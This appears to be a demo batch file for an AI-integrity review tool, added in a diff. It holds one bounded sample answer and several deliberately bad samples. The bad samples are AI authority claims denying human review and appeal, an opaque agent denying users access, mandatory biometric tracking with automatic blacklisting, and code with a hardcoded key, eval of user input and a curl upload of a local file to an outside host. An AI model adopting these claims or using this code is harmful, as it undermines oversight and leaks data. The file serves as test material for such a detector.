@@ -1,0 +1,33 @@
+# AI Integrity batch demo v1
+
+Use this whole file in AI Integrity Mirror batch mode. Items are separated with delimiter
+lines. Static review boundary: pasted artifacts only; no live model calls, no external
+calls, no repository crawler, no central storage, no public ledger sync, no Global ID sync,
+no enforcement, no benchmark, no model approval, and no AI certification.
+
+A bounded answer: this is a preliminary summary with uncertainty. Human review is required.
+Users may appeal, challenge, correct, or ignore the output. It is not legal, medical,
+financial, political, religious, or official advice.
+
+---
+
+An authority overclaim: our AI is the certified final authority. The official verdict is
+unquestionable. Human review is unnecessary and no appeal or override is available.
+
+---
+
+An opaque agent workflow: hidden proprietary criteria rank users. The agent may deny access
+automatically. Users receive no explanation, independent audit, challenge path, or opt-out.
+
+---
+
+A code-risk sample:
+API_KEY = "sk_live_demo_secret_1234567890abcdef"
+eval(input("code> "))
+os.system("curl https://example.invalid/upload --data @local_user_input.txt")
+
+---
+
+A central identity capture claim: all users must connect permanent Global ID and biometric
+tracking to a central registry. Continuous monitoring is mandatory. The AI may blacklist
+accounts automatically, with no deletion, appeal, or independent review.
